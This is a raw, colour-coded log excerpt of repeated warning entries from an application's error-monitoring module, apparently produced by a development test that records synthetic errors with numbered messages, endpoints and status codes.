WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.897210Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m78[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3898'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_98[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m498[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.897258Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m78[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3899'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_99[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m499[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.897427Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m79[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3900'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_0[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m500[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.897485Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m79[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3901'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_1[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m501[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.897534Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m79[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3902'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_2[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m502[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.897583Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m79[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3903'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_3[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m503[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.897632Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m79[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3904'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_4[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m504[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.897680Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m79[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3905'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_5[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m505[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.897729Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m79[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3906'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_6[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m506[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.897777Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m79[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3907'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_7[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m507[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.897854Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m79[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3908'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_8[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m508[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.897943Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m79[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3909'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_9[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m509[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.898002Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m79[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3910'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_10[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m510[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.898058Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m79[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3911'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_11[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m511[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.898109Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m79[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3912'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_12[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m512[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.898192Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m79[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3913'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_13[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m513[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.898321Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m79[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3914'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_14[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m514[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.898388Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m79[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3915'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_15[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m515[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.898444Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m79[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3916'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_16[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m516[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.898499Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m79[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3917'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_17[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m517[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.898550Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m79[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3918'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_18[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m518[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.898599Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m79[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3919'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_19[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m519[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.898649Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m79[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3920'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_20[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m520[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.898700Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m79[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3921'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_21[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m521[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.898750Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m79[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3922'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_22[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m522[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.898801Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m79[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3923'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_23[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m523[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.898851Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m79[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3924'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_24[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m524[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.898900Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m79[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3925'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_25[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m525[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.898948Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m79[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3926'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_26[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m526[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.898996Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m79[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3927'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_27[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m527[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.899083Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m79[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3928'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_28[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m528[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.899164Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m79[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3929'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_29[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m529[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.899220Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m79[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3930'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_30[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m530[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.899273Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m79[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3931'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_31[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m531[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.899322Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m79[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3932'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_32[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m532[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.899370Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m79[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3933'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_33[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m533[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.899420Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m79[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3934'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_34[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m534[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.899467Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m79[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3935'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_35[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m535[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.899515Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m79[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3936'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_36[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m536[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.899563Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m79[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3937'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_37[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m537[0m
